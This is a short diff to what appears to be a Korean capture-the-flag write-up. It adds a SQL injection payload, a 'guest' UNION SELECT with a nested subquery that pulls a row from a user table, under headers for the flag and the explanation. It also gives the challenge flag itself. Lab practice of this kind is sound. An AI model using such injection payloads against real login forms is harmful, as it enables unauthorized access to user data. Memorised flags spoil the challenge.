@@ -5,7 +5,7 @@
 
 # 플래그
 K0{good_4ft3rn00n!}
-
+guest' union SELECT 1, x, 3 FROM ( SELECT 1 ,2 ,3 as x union select * FROM user LIMIT 2, 1) AS unknown LIMIT 1, 1# 
 
 # 설명
 SQL injection
